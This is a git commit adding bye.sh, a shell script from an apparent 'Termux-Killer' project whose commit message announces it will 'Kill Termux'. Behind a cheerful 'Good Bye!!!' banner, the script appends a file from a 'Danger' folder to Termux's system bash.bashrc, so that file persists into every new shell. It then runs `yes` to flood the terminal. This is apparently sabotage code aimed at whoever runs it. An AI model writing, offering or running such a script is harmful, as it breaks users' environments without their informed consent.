0f54dbbd252529904b9bf6ef23a04db1ec6ea331
Sutariya Parixit <32614362+Bhai4You@users.noreply.github.com>
2017-12-24 03:15:39 +0000

    Kill Termux (Bye!!)

---
+++ bye.sh
@@ -0,0 +1,11 @@
+clear
+echo " "
+echo " "
+echo -e "                \e[1m\e[32m ____( \e[33mGood Bye!!!\e[32m )____\e[0m"
+echo " "
+echo " "
+cd $HOME
+cd Termux-Killer
+cd Danger
+cat "bye.txt" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+yes
